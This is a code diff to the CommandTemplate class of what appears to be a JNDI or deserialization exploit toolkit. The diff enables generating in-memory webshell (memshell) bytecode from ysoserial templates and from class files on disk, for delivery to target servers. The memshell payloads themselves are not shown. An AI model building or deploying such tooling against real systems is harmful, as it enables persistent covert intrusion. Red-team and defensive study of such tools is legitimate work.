@@ -1,8 +1,9 @@
 package com.bloom.Template;
 
 
+import com.bloom.exploit.GenMemshellResolver;
 import com.bloom.util.Functions;
-import com.bloom.util.Util;
+import com.bloom.util.Functions;
 import com.unboundid.util.Base64;
 import org.apache.wicket.util.file.Files;
 import org.objectweb.asm.*;
@@ -20,26 +21,38 @@ public class CommandTemplate implements Template{
     public CommandTemplate(String cmd){
         this.cmd = cmd;
         if (this.cmd.startsWith("CLASS:")){
-            String loadshell="ysoserial.payloads.templates."+this.cmd.substring(6);
-            this.className = loadshell;
-//            try {
-//                Class clazz=Class.forName(loadshell);
-////                this.className = this.cmd.substring(6);
-////                generateMemshell(clazz);
-////                this.className = "Exploit" + Functions.getRandomString();
-//            } catch (Exception e) {
-//                System.out.println("无该内存马类型");
-//            }
+            String shortName=this.cmd.substring(6);
+            // key 统一为简单类名：Cache 静态块、HTTP 端（截 URL 文件名）、javaFactory 三处对齐
+            this.className = shortName;
+            try {
+                // initialize=false：只需类对象读字节码，避免执行依赖容器环境的 <clinit>
+                generateMemshell(Class.forName("ysoserial.payloads.templates."+shortName, false, CommandTemplate.class.getClassLoader()));
+            } catch (Exception e) {
+                // 失败态：bytes 保持 null，cache() 跳过写入，不静默继续
+                System.out.println("[!] 无该内存马类型: " + shortName);
+            }
+        } else if (this.cmd.startsWith("GEN:")) {
+            String combo = this.cmd.substring(4);
+            String templateName = GenMemshellResolver.resolve(combo);
+            if (templateName == null) {
+                System.out.println("[!] 无该 GEN 组合: " + combo);
+                this.className = "INVALID";
+            } else {
+                this.className = templateName;
+                try {
+                    generateMemshell(Class.forName("ysoserial.payloads.templates." + templateName, false, CommandTemplate.class.getClassLoader()));
+                } catch (Exception e) {
+                    System.out.println("[!] GEN 模板加载失败: " + templateName);
+                }
+            }
         } else if (this.cmd.startsWith("FILE:")) {
-            this.className = this.cmd.substring(5);
-//            String path = "data/" + this.cmd.substring(5) +".class";
-//            try {
-////                bytes = Files.readBytes(new File(path));
-//                bytes = Functions.getClassBytes(path);
-//            }catch (Exception e) {
-////                throw new RuntimeException(e);
-//                System.out.println("data目录下无该文件");
-//            }
+            String shortName=this.cmd.substring(5);
+            this.className = shortName;
+            try {
+                bytes = Files.readBytes(new File("data/" + shortName + ".class"));
+            }catch (Exception e) {
+                System.out.println("[!] data目录下无该文件: " + shortName);
+            }
         }else {
             this.className = "Exploit" + Functions.getRandomString();
             generate();
@@ -168,7 +181,7 @@ public class CommandTemplate implements Template{
     }
 
     public void generateMemshell(Class clazz) throws Exception {
-        bytes = Base64.decode(Util.getClassCode(clazz));
+        bytes = Base64.decode(Functions.getClassCode(clazz));
     }
 
 }
